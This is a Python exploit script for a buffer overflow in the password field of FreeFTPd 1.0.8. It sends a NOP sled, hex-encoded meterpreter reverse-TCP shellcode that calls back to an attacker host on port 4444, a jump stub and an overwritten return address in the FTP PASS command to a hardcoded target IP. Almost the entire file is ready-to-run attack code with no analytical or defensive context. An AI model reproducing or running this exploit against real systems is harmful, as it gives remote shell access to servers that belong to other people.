#!/usr/bin/python

#########################################################################
# Application: FreeFTPd 1.0.8                                           #
# Vendor Website: http://www.freesshd.com                               #
# Author:            VOSEC                                              #
# Website: https://veilofsecurity.com                                   #
# Description: Buffer overflow in password field                        #
#########################################################################

import sys
import socket

ip = "10.10.100.141"
port = 21

nops = "\x90"*417

#shellcode = 360bytes
#msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.100.103 lport=4444 -b "\x00\x0a" -f python
shellcode =  ""
shellcode += "\xd9\xf7\xd9\x74\x24\xf4\xba\xaa\xd3\xa9\x7d\x5b\x2b"
shellcode += "\xc9\xb1\x54\x31\x53\x18\x83\xc3\x04\x03\x53\xbe\x31"
shellcode += "\x5c\x81\x56\x37\x9f\x7a\xa6\x58\x29\x9f\x97\x58\x4d"
shellcode += "\xeb\x87\x68\x05\xb9\x2b\x02\x4b\x2a\xb8\x66\x44\x5d"
shellcode += "\x09\xcc\xb2\x50\x8a\x7d\x86\xf3\x08\x7c\xdb\xd3\x31"
shellcode += "\x4f\x2e\x15\x76\xb2\xc3\x47\x2f\xb8\x76\x78\x44\xf4"
shellcode += "\x4a\xf3\x16\x18\xcb\xe0\xee\x1b\xfa\xb6\x65\x42\xdc"
shellcode += "\x39\xaa\xfe\x55\x22\xaf\x3b\x2f\xd9\x1b\xb7\xae\x0b"
shellcode += "\x52\x38\x1c\x72\x5b\xcb\x5c\xb2\x5b\x34\x2b\xca\x98"
shellcode += "\xc9\x2c\x09\xe3\x15\xb8\x8a\x43\xdd\x1a\x77\x72\x32"
shellcode += "\xfc\xfc\x78\xff\x8a\x5b\x9c\xfe\x5f\xd0\x98\x8b\x61"
shellcode += "\x37\x29\xcf\x45\x93\x72\x8b\xe4\x82\xde\x7a\x18\xd4"
shellcode += "\x81\x23\xbc\x9e\x2f\x37\xcd\xfc\x27\xf4\xfc\xfe\xb7"
shellcode += "\x92\x77\x8c\x85\x3d\x2c\x1a\xa5\xb6\xea\xdd\xca\xec"
shellcode += "\x4b\x71\x35\x0f\xac\x5b\xf1\x5b\xfc\xf3\xd0\xe3\x97"
shellcode += "\x03\xdd\x31\x0d\x0e\x49\xb0\xd8\x6a\xee\xac\xde\x72"
shellcode += "\xe1\x70\x56\x94\x51\xd9\x38\x09\x11\x89\xf8\xf9\xf9"
shellcode += "\xc3\xf6\x26\x19\xec\xdc\x4e\xb3\x03\x89\x27\x2b\xbd"
shellcode += "\x90\xbc\xca\x42\x0f\xb9\xcc\xc9\xba\x3d\x82\x39\xce"
shellcode += "\x2d\xf2\x5b\x30\xae\x02\xf6\x30\xc4\x06\x50\x66\x70"
shellcode += "\x04\x85\x40\xdf\xf7\xe0\xd2\x18\x07\x75\xe3\x53\x31"
shellcode += "\xe3\x4b\x0c\x3d\xe3\x4b\xcc\x6b\x69\x4c\xa4\xcb\xc9"
shellcode += "\x1f\xd1\x14\xc4\x33\x4a\x80\xe7\x65\x3e\x03\x80\x8b"
shellcode += "\x19\x63\x0f\x73\x4c\xf0\x48\x8b\x12\xd4\xf0\xe4\xec"
shellcode += "\x58\x01\xf5\x86\x58\x51\x9d\x5d\x77\x5e\x6d\x9d\x52"
shellcode += "\x37\xe5\x14\x32\xf5\x94\x29\x1f\x5b\x09\x29\x93\x40"
shellcode += "\x5c\xa4\x54\x77\x61\x46\x69\xa1\x58\x3c\xaa\x71\xdf"
shellcode += "\x4f\x81\xd4\x76\xda\xe9\x4b\x88\xcf"

eip_magic = "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x1A\x80\xE9\x10\x90\xFE\xCD\xFE\xCD\xFF\xE1"

short_jmp = "\xeb\xea\x90\x90"

return_addr = "\x59\x14\x40\x00"

buffer = nops + shellcode + eip_magic + short_jmp + return_addr

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS ")
s.send(buffer)
s.send("\r\n")
s.recv(1024)
s.close()